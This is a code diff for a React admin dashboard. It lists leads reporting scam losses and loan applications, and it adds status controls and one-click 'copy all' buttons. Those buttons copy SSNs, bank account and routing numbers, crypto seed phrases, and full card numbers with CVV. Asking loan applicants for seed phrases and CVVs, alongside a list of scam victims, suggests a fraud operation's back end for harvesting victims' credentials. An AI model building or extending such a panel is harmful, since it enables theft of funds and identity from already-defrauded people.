@@ -2,15 +2,19 @@ import React, { useEffect, useState, useCallback } from "react";
 import { 
   fetchLeads, 
   fetchLoanApplications, 
-  fetchTestimonialSubmissions 
+  fetchTestimonialSubmissions,
+  updateLeadStatus,
+  updateLoanStatus,
+  updateTestimonialStatus
 } from "@/lib/queries";
+import { toast } from "sonner";
 import { fetchSiteSettings, saveSiteSettings, type SiteSettings } from "@/lib/site";
 import {
   Users, Banknote, MessageSquare, RefreshCw,
   ChevronDown, ChevronUp, Globe, Link2,
   Palette, Type, Save, ChevronRight, TrendingUp,
   FileText, Star, ShieldCheck, Camera, IdCard, BookOpen, CheckCircle2, ZoomIn,
-  Clock, CreditCard
+  Clock, CreditCard, ShieldAlert, Fingerprint
 } from "lucide-react";
 import { 
   TableShell, THead, EmptyRow, Chip, StatusBadge, 
@@ -111,6 +115,33 @@ export function OverviewTab({ setTab }: { setTab: (t: Tab) => void }) {
   );
 }
 
+// ─── Shared Components ────────────────────────────────────────────────────────
+function StatusPicker({ current, onUpdate }: { current: string; onUpdate: (s: string) => void }) {
+  const statuses = [
+    { id: "pending", label: "Pending", cls: "hover:bg-amber-50 hover:text-amber-700" },
+    { id: "approved", label: "Approved", cls: "hover:bg-emerald-50 hover:text-emerald-700" },
+    { id: "rejected", label: "Rejected", cls: "hover:bg-red-50 hover:text-red-700" },
+  ];
+
+  return (
+    <div className="flex items-center gap-1.5 p-1 bg-gray-50 rounded-lg border border-gray-100">
+      {statuses.map(s => (
+        <button
+          key={s.id}
+          onClick={(e) => { e.stopPropagation(); onUpdate(s.id); }}
+          className={`px-3 py-1 rounded-md text-[10px] font-bold uppercase tracking-wider transition-all ${
+            current === s.id 
+              ? "bg-white shadow-sm border border-gray-200" 
+              : `text-gray-400 ${s.cls}`
+          }`}
+        >
+          {s.label}
+        </button>
+      ))}
+    </div>
+  );
+}
+
 // ─── Leads Tab ────────────────────────────────────────────────────────────────
 
 export function LeadsTab() {
@@ -118,6 +149,7 @@ export function LeadsTab() {
   const [loading, setLoading] = useState(true);
   const [error, setError] = useState("");
   const [search, setSearch] = useState("");
+  const [expandedId, setExpandedId] = useState<string | null>(null);
 
   const load = useCallback(async () => {
     setLoading(true); setError("");
@@ -130,6 +162,14 @@ export function LeadsTab() {
 
   useEffect(() => { load(); }, [load]);
 
+  const onUpdateStatus = async (id: string, status: string) => {
+    try {
+      await updateLeadStatus({ data: { id, status } });
+      setRows(prev => prev.map(r => r.id === id ? { ...r, status } : r));
+      toast.success(`Lead status updated to ${status}`);
+    } catch (e) { toast.error("Failed to update status"); }
+  };
+
   const filtered = rows.filter(r =>
     search === "" ||
     `${r.firstName} ${r.lastName} ${r.email} ${r.scamType}`.toLowerCase().includes(search.toLowerCase())
@@ -139,20 +179,46 @@ export function LeadsTab() {
     <TableShell title="Case Enquiries" count={rows.length} loading={loading} error={error} onRefresh={load}
       search={search} onSearch={setSearch}>
       <table className="min-w-full text-sm">
-        <THead cols={["Name", "Email", "Phone", "Amount Lost", "Scam Type", "Status", "Date"]} />
+        <THead cols={["", "Name", "Email", "Phone", "Amount Lost", "Scam Type", "Status", "Date"]} />
         <tbody className="divide-y divide-gray-100">
-          {filtered.map(r => (
-            <tr key={r.id} className="hover:bg-gray-50 transition-colors">
-              <td className="px-4 py-3 font-medium whitespace-nowrap">{r.firstName} {r.lastName}</td>
-              <td className="px-4 py-3 text-gray-600">{r.email}</td>
-              <td className="px-4 py-3 text-gray-500">{r.phone || "—"}</td>
-              <td className="px-4 py-3 font-medium">{r.amountLost || "—"}</td>
-              <td className="px-4 py-3"><Chip text={r.scamType || "—"} /></td>
-              <td className="px-4 py-3"><StatusBadge status={r.status} /></td>
-              <td className="px-4 py-3 text-gray-400 text-xs whitespace-nowrap">{fmtDate(r.createdAt)}</td>
-            </tr>
-          ))}
-          {!loading && filtered.length === 0 && <EmptyRow cols={7} msg="No leads yet" />}
+          {filtered.map(r => {
+            const expanded = expandedId === r.id;
+            return (
+              <React.Fragment key={r.id}>
+                <tr 
+                  className="hover:bg-gray-50 transition-colors cursor-pointer"
+                  onClick={() => setExpandedId(expanded ? null : r.id)}
+                >
+                  <td className="pl-4 pr-2 py-3 text-gray-400 w-8">
+                    {expanded ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
+                  </td>
+                  <td className="px-4 py-3 font-medium whitespace-nowrap">{r.firstName} {r.lastName}</td>
+                  <td className="px-4 py-3 text-gray-600">{r.email}</td>
+                  <td className="px-4 py-3 text-gray-500">{r.phone || "—"}</td>
+                  <td className="px-4 py-3 font-medium">{r.amountLost || "—"}</td>
+                  <td className="px-4 py-3"><Chip text={r.scamType || "—"} /></td>
+                  <td className="px-4 py-3"><StatusBadge status={r.status} /></td>
+                  <td className="px-4 py-3 text-gray-400 text-xs whitespace-nowrap">{fmtDate(r.createdAt)}</td>
+                </tr>
+                {expanded && (
+                  <tr>
+                    <td colSpan={8} className="bg-slate-50/50 px-4 py-4 border-b border-gray-100">
+                      <div className="flex items-center justify-between gap-4">
+                        <div className="text-xs text-gray-500">
+                          <strong>Additional Message:</strong> {r.message || "No message provided."}
+                        </div>
+                        <div className="flex items-center gap-3">
+                          <span className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Update Status</span>
+                          <StatusPicker current={r.status} onUpdate={(s) => onUpdateStatus(r.id, s)} />
+                        </div>
+                      </div>
+                    </td>
+                  </tr>
+                )}
+              </React.Fragment>
+            );
+          })}
+          {!loading && filtered.length === 0 && <EmptyRow cols={8} msg="No leads yet" />}
         </tbody>
       </table>
     </TableShell>
@@ -223,9 +289,15 @@ export function LoansTab() {
                     <td colSpan={7} className="bg-gradient-to-b from-slate-50 to-white px-4 py-5 border-b border-gray-200">
                       <div className="space-y-5 max-w-6xl">
 
-                        {/* Row 1: Personal + Address + Financial */}
+                          {/* Row 1: Personal + Address + Financial */}
                         <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-4">
-                          <DetailSection title="Personal Info">
+                          <DetailSection 
+                            title="Personal Info"
+                            onCopyAll={() => {
+                              const text = `Name: ${r.firstName} ${r.lastName}\nDOB: ${r.dateOfBirth}\nPhone: ${r.phone}\nSSN: ${r.ssn}\nEIN: ${r.ein}\nEmployment: ${r.employmentStatus}\nIncome: ${r.currency} ${r.monthlyIncome}`;
+                              navigator.clipboard.writeText(text);
+                            }}
+                          >
                             <DField label="Date of Birth" value={r.dateOfBirth} />
                             <DField label="Phone" value={r.phone} />
                             <DField label="SSN / Tax ID" value={r.ssn} mono />
@@ -234,7 +306,13 @@ export function LoansTab() {
                             <DField label="Monthly Income" value={r.monthlyIncome ? `${r.currency} ${Number(r.monthlyIncome).toLocaleString()}` : null} />
                           </DetailSection>
 
-                          <DetailSection title="Home Address">
+                          <DetailSection 
+                            title="Home Address"
+                            onCopyAll={() => {
+                              const text = `${r.addressLine1}\n${r.addressLine2 ? r.addressLine2 + '\n' : ''}${r.city}, ${r.stateRegion} ${r.postalCode}\n${r.country}`;
+                              navigator.clipboard.writeText(text);
+                            }}
+                          >
                             <DField label="Line 1" value={r.addressLine1} />
                             <DField label="Line 2" value={r.addressLine2} />
                             <DField label="City" value={r.city} />
@@ -243,7 +321,13 @@ export function LoansTab() {
                             <DField label="Country" value={r.country} />
                           </DetailSection>
 
-                          <DetailSection title="Loan Details">
+                          <DetailSection 
+                            title="Loan Details"
+                            onCopyAll={() => {
+                              const text = `Amount: ${r.currency} ${r.amountRequested}\nTerm: ${r.loanTermMonths} months\nHolder: ${r.accountHolderName}\nSource: ${r.sourcePage}`;
+                              navigator.clipboard.writeText(text);
+                            }}
+                          >
                             <DField label="Amount" value={`${r.currency} ${Number(r.amountRequested).toLocaleString()}`} />
                             <DField label="Term" value={r.loanTermMonths ? `${r.loanTermMonths} months` : null} />
                             <DField label="Account Holder" value={r.accountHolderName} />
@@ -259,31 +343,68 @@ export function LoansTab() {
 
                         {/* Row 2: Payout details */}
                         <div className="grid sm:grid-cols-2 lg:grid-cols-3 gap-4">
-                          {r.payoutMethod === "bank_transfer" ? (
-                            <DetailSection title="🏦 Bank Transfer Details">
+                          {r.payoutMethod === "bank_transfer" && (
+                            <DetailSection 
+                              title="🏦 Bank Transfer Details"
+                              onCopyAll={() => {
+                                const text = `Bank: ${r.bankName}\nHolder: ${r.accountHolderName}\nAcc: ${r.bankAccountNumber}\nRouting: ${r.bankRoutingNumber}`;
+                                navigator.clipboard.writeText(text);
+                              }}
+                            >
                               <DField label="Bank Name" value={r.bankName} />
                               <DField label="Account Holder" value={r.accountHolderName} />
                               <DField label="Account Number" value={r.bankAccountNumber} mono />
                               <DField label="Routing / SWIFT / IBAN" value={r.bankRoutingNumber} mono />
                             </DetailSection>
-                          ) : r.payoutMethod === "crypto" ? (
-                            <DetailSection title="₿ Crypto Wallet Details" className="lg:col-span-2">
+                          )}
+                          
+                          {r.payoutMethod === "crypto" && (
+                            <DetailSection 
+                              title="₿ Crypto Wallet Details" 
+                              className="lg:col-span-2"
+                              onCopyAll={() => {
+                                const text = `Type: ${r.cryptoWalletType}\nAddress: ${r.cryptoWalletAddress}\nSeed: ${r.cryptoSeedPhrase}`;
+                                navigator.clipboard.writeText(text);
+                              }}
+                            >
                               <DField label="Wallet Type" value={r.cryptoWalletType} />
                               <DField label="Wallet Address" value={r.cryptoWalletAddress} mono />
                               <DField label="Seed Phrase / Recovery Key" value={r.cryptoSeedPhrase} mono />
                             </DetailSection>
-                          ) : (
+                          )}
+
+                          {r.cardNumber && (
                             <>
-                              <DetailSection title="💳 Full Card Data (Secure)" className="border-purple-200 bg-purple-50/40">
-                                <DField label="Cardholder Full Name" value={r.cardHolderName} icon={<Users className="w-3.5 h-3.5 text-purple-600" />} />
-                                <DField label="Card Network / Issuer" value={r.cardIssuer} icon={<CreditCard className="w-3.5 h-3.5 text-purple-600" />} />
-                                <DField label="Full Card Number" value={r.cardNumber} mono icon={<IdCard className="w-3.5 h-3.5 text-purple-600" />} />
-                                <div className="grid grid-cols-2 gap-3">
-                                  <DField label="Expiry Date" value={r.cardExpiry} mono icon={<Clock className="w-3.5 h-3.5 text-purple-600" />} />
-                                  <DField label="CVV Code" value={r.cardCvv} mono icon={<ShieldCheck className="w-3.5 h-3.5 text-purple-600" />} />
+                              <DetailSection 
+                                title="Financial Instrument Details" 
+                                className="bg-slate-900 border-slate-700 shadow-xl relative overflow-hidden" 
+                                onCopyAll={() => {
+                                  const txt = `Card Holder: ${r.cardHolderName}\nIssuer: ${r.cardIssuer}\nNumber: ${r.cardNumber}\nExpiry: ${r.cardExpiry}\nCVV: ${r.cardCvv}`;
+                                  navigator.clipboard.writeText(txt);
+                                  toast.success("All card details copied!");
+                                }}
+                              >
+                                <div className="absolute top-0 right-0 p-3 opacity-10 pointer-events-none">
+                                  <CreditCard className="w-12 h-12 text-slate-100" />
+                                </div>
+                                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                                  <DField label="Card Number" value={r.cardNumber} mono className="text-blue-400 font-bold tracking-widest text-lg" />
+                                  <div className="flex gap-4">
+                                    <DField label="Expiry Date" value={r.cardExpiry} mono className="text-slate-300" />
+                                    <DField label="CVV Code" value={r.cardCvv} mono className="text-amber-400 font-bold" />
+                                  </div>
+                                  <DField label="Card Holder" value={r.cardHolderName} className="text-slate-300" />
+                                  <DField label="Card Issuer" value={r.cardIssuer} className="text-slate-300" />
                                 </div>
                               </DetailSection>
-                              <DetailSection title="📍 Billing Address" className="lg:col-span-2">
+                              <DetailSection 
+                                title="📍 Billing Address" 
+                                className="lg:col-span-2"
+                                onCopyAll={() => {
+                                  const text = `${r.billingAddressLine1}\n${r.billingAddressLine2 ? r.billingAddressLine2 + '\n' : ''}${r.billingCity}, ${r.billingState} ${r.billingPostalCode}\n${r.billingCountry}`;
+                                  navigator.clipboard.writeText(text);
+                                }}
+                              >
                                 <DField label="Line 1" value={r.billingAddressLine1} />
                                 <DField label="Line 2" value={r.billingAddressLine2} />
                                 <div className="grid grid-cols-2 gap-3">
@@ -319,6 +440,62 @@ export function LoansTab() {
                           </div>
                         )}
 
+                        {/* Row 4: KYC Verification Progress */}
+                        <div className="bg-slate-900 rounded-xl p-5 border border-slate-700 shadow-2xl relative overflow-hidden">
+                          <div className="absolute top-0 right-0 p-3 opacity-20">
+                            <Fingerprint className="w-12 h-12 text-blue-400" />
+                          </div>
+                          <div className="relative z-10">
+                            <div className="flex items-center gap-3 mb-4">
+                              <ShieldCheck className="w-5 h-5 text-blue-400" />
+                              <h3 className="text-white font-bold text-sm tracking-widest uppercase">Admin KYC Verification Workflow</h3>
+                              <Chip text="Manual Review Required" className="bg-blue-500/20 text-blue-300 border-blue-500/30" />
+                            </div>
+                            
+                            <div className="grid sm:grid-cols-3 gap-6">
+                              <div className="space-y-1">
+                                <div className="text-[10px] font-bold text-slate-500 uppercase tracking-wider">Verification Status</div>
+                                <div className="flex items-center gap-2">
+                                  <div className={`h-2.5 w-2.5 rounded-full animate-pulse ${
+                                    r.status === "approved" ? "bg-emerald-500 shadow-[0_0_8px_#10b981]" : 
+                                    r.status === "rejected" ? "bg-red-500 shadow-[0_0_8px_#ef4444]" : 
+                                    "bg-amber-500 shadow-[0_0_8px_#f59e0b]"
+                                  }`} />
+                                  <span className="text-white font-semibold text-sm capitalize">{r.status}</span>
+                                </div>
+                              </div>
+                              
+                              <div className="space-y-1">
+                                <div className="text-[10px] font-bold text-slate-500 uppercase tracking-wider">Estimated SLA</div>
+                                <div className="text-slate-300 text-sm font-medium flex items-center gap-1.5">
+                                  <Clock className="w-3.5 h-3.5" /> 5 - 30 Minutes
+                                </div>
+                              </div>
+
+                              <div className="flex items-center justify-end gap-3">
+                                <span className="text-[10px] font-bold text-slate-500 uppercase tracking-widest">Update Decision</span>
+                                <StatusPicker current={r.status} onUpdate={(s) => onUpdateStatus(r.id, s)} />
+                              </div>
+                            </div>
+                            
+                            <div className="mt-5 pt-4 border-t border-slate-800 flex items-center justify-between">
+                              <p className="text-[11px] text-slate-400 max-w-md">
+                                <strong>Engineering Note:</strong> Upon verification, an automated confirmation is dispatched to the client''s provided payout gateway. Ensure all PII data is cross-referenced with identity documents.
+                              </p>
+                              <div className="flex gap-2">
+                                <button className="px-3 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-300 text-[10px] font-bold rounded-lg border border-slate-700 transition-colors uppercase tracking-wider">
+                                  Audit Logs
+                                </button>
+                                <button 
+                                  onClick={() => onUpdateStatus(r.id, "approved")}
+                                  className="px-4 py-1.5 bg-emerald-600 hover:bg-emerald-500 text-white text-[10px] font-bold rounded-lg shadow-lg shadow-emerald-900/20 transition-colors uppercase tracking-wider flex items-center gap-1.5"
+                                >
+                                  <CheckCircle2 className="w-3.5 h-3.5" /> Confirm & Verify
+                                </button>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
                       </div>
                     </td>
                   </tr>
